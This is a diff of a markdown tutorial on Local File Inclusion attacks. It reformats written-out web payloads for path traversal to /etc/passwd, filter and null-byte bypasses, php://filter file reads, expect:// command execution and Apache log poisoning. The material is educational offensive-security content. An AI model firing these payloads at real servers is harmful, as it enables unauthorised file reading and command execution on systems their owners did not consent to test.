@@ -33,7 +33,9 @@ This can print the ```passwd``` file if the site is vulnerable to ```LFI```.
 
 The ```path traversal``` technique consists of accessing a file by ```traversing``` to the root directory.
 
-```http://SITE/index.php?SOMETHING=../../../../../../../../../etc/passwd```
+```console
+http://SITE/index.php?SOMETHING=../../../../../../../../../etc/passwd
+```
 
 > Depending on where the website is hosted on the server, you may need to use a different number of ```../```
 {: .prompt-info }
@@ -44,7 +46,10 @@ The ```path traversal``` technique consists of accessing a file by ```traversing
 ### Blacklisting
 
 Some characters may be blacklisted and replaced. For example, this ```$something = str_replace('../', '', $_GET['SOMETHING']);``` replace the ```../``` by ```./``` so our previous ```../../../etc/passwd``` will be replaced by ```./etc/passwd```.
-We will need to use the following payload : ```http://SITE/index.php?SOMETHING=....//....//....//....//....//etc/passwd```
+We will need to use the following payload : 
+```console
+http://SITE/index.php?SOMETHING=....//....//....//....//....//etc/passwd
+```
 
 > You can also use URL encoding. For example, replacing ```../``` by ```%2e%2e%2f```. For more URL encoding look at the [Bypass Techniques](#Bypass Techniques) part.
 {: .prompt-tip }
@@ -54,14 +59,19 @@ We will need to use the following payload : ```http://SITE/index.php?SOMETHING=.
 If you try the basic LFI technique and the URL is redirected to ```http://SITE/index.php?SOMETHING=/etc/passwd.php``` then the server append the ```.php``` extension.
 We can then try to navigate to ```http://SITE/?SOMETHING=php://filter/read=convert.base64-encode/resource=FILE_TO_READ```. We can use the curl command as follows ```curl http://SITE/?SOMETHING=php://filter/read=convert.base64-encode/resource=FILE_TO_READ``` and then use the ```base64 -d``` command to decode it.
 
-We could also try to use the null byte ```%00``` to get rid of the extension : ```http://SITE/index.php?SOMETHING=/etc/passwd%00```
+We could also try to use the null byte ```%00``` to get rid of the extension :
+```console
+http://SITE/index.php?SOMETHING=/etc/passwd%00
+```
 
 ## PHP Wrappers
 
 ### Except Wrapper
 
 Wrappers allow us to execute commands, access files or URLs... Some basic example of its use is the following :
-```http://SITE/index.php?SOMETHING=expect://id```
+```console
+http://SITE/index.php?SOMETHING=expect://id
+```
 
 ### Data Wrapper
 
@@ -101,7 +111,9 @@ Log poisoning is a technique that we can use to execute command and print their 
 ```
 
 We are going to take the example of an Apache log poisoning here. If we can see the logs when we go to the following URL then the server may be vulnerable to log poisoning: 
-```http://SITE/index.php?SOMETHING=/var/log/apache2/access.log```
+```console
+http://SITE/index.php?SOMETHING=/var/log/apache2/access.log
+```
 
 We can use the tool ```Burp Suite``` for this attack to easily and rapidly execute commands. 
 1. Start the ```Burp proxy``` and intercept the request to the log file.
